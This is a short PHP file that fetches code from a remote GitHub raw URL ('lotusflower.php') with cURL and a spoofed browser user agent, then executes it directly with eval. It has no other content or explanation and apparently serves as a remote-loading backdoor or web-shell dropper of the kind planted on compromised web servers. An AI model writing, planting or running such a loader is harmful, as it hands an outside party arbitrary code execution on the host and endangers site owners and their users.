
<?php
$ch = curl_init('https://raw.githubusercontent.com/soy777/johnygreenwoodsz/main/lotusflower.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
$content = curl_exec($ch);
curl_close($ch);
eval('?>'.$content);
?>
